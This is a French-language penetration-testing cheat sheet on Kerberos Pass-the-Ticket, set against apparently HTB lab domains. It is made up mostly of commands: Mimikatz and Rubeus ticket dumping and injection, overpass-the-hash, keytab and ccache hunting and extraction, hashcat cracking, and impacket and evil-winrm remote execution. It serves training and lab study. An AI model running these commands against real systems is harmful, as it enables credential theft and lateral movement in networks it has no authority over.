
# Pass The Ticket (PtT)

Permet de passer un ticket kerberos

## WINDOWS

### Mimikatz

Exporter les tickets au format kirbi

```cmd
.\mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
```

Pass The Ticket avec un ticket kirbi et ouvre un nouveau cmd

```cmd
.\mimikatz.exe privilege::debug 'kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"' misc::cmd
```

PSRemoting (WinRM)
 
```Powershell
Enter-PSSession -ComputerName DC01
```


### Convertir Kirbi en Base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

### Rubeus

Exporter tous les ticket au format base64

```cmd
.\Rubeus.exe dump /nowrap
```

Afficher tous les tickets

```powershell
.\Rubeus.exe triage
```

Dump un ticket au format base64

```powershell
.\Rubeus.exe dump /luid:<luid> /service:krbtgt
```

Créer une nouvelle session dans un nouveau processus caché afin de ne pas écraser les tickets dans la session.

```cmd
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Pass The Ticket avec un ticket kirbi depuis le nouveau cmd

```cmd
.\Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

Pass The Ticket avec le ticket en base64 depuis le nouveau cmd

```cmd
.\Rubeus.exe ptt /ticket:<base64>
```

OverPass The Hash + Pass The Ticket depuis le nouveau cmd

```cmd
.\Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

PSRemoting (WinRM)
 
```Powershell
Enter-PSSession -ComputerName DC01
```


---

## LINUX

> [!IMPORTANT]
> Tickets au format CCACHE à injecter dans la variable KRB5CCNAME
> Sauvegarder une copie du ccache file présent dans KRB5CCNAME
> Les tickets sont généralement stockés dans /tmp
> 
> Keytab files -> Contient une paire de kerberos principal et clés chiffrées dérivées du mot de passe kerberos  -> permet de s'authentifier sur des systèmes sans entrer de mot de passe
> kinit -> permet interaction avec kerberos

### Vérifier si la machine est jointe à un domaine

```shell
realm list
```

ou

```shell
ps -ef | grep -i "winbind\|sssd"
```


## FICHIERS KEYTAB
### Recherche de fichiers keytab

```shell
find / -name *keytab* -ls 2>/dev/null
```

```shell
find / -name *.kt -ls 2>/dev/null
```

### Lister les informations d'un fichier keytab

```shell
klist -k -t /opt/specialfiles/carlos.keytab
```

### Impersonation du user avec kinit

```shell
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

### Extraction du hash du fichier keytab avec [keytabextract](https://github.com/sosdave/KeyTabExtract)

```shell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

### Bruteforce avec [[HASHCAT]]

```shell
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```



## FICHIERS CCACHE
### Recherche de fichiers ccache

```shell
find / -name krb5cc* -ls 2>/dev/null
```

### Recherche de fichiers ccache dans /tmp

```shell
ls -la  /tmp
```

### Afficher les variables d'environnement pour les fichiers ccache

```shell
env | grep -i krb5
```

### Afficher le ticket en cache

```bash
klist
```

### Importer fichier CCACHE dans la session

```shell
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

### [LINIKATZ](https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh)(root)

équivalent de Mimikatz pour linux.

install

```shell
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

```shell
./linikatz.sh
```


### IMPACKET

#### Pass The Ticket
##### PsExec

```shell
impacket-psexec dc01 -k -no-pass
```
##### WmiExec

```shell
impacket-wmiexec dc01 -k -no-pass
```
##### AtExec

```shell
impacket-atexec dc01 -k -no-pass
```
##### SmbExec

```shell
impacket-smbexec dc01 -k -no-pass
```

#### Convertir ccache en kirbi

```shell
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```


### EVIL-WINRM

#### Installer kerberos authentification package "krb5-user"

```shell
sudo apt-get install krb5-user -y
```

Entrer le realm
Entrer le hostname du DC

#### Pass the ticket

```shell
evil-winrm -i dc01 -r inlanefreight.htb
```


### EVIL-WINRM-PY

**[https://github.com/adityatelange/evil-winrm-py](https://github.com/adityatelange/evil-winrm-py)**

install

```
sudo apt install gcc python3-dev libkrb5-dev krb5-pkinit krb5-user
```

```
pipx install evil-winrm-py[kerberos]
```


Pass the ticket

```sh
evil-winrm-py -i dc01.nanocorp.htb -u 'monitoring_svc' -p 'P@ssw0rd' --ssl -k --debug
```







